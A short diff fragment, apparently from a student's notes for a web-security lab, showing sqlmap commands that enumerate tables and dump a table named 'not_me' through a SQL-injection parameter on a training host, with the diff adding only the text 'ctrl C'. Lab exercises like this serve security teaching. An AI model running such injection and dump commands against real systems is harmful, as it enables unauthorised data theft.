@@ -40,4 +40,6 @@ sqlmap:
 sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --dbms=sqlite --tables
 sqlmap -u "http://web0x01.hbtn/api/a3/sql_injection/all_orders?status=paid" --dbms=sqlite --dump -T not_me
 
+ctrl C
+
 ======
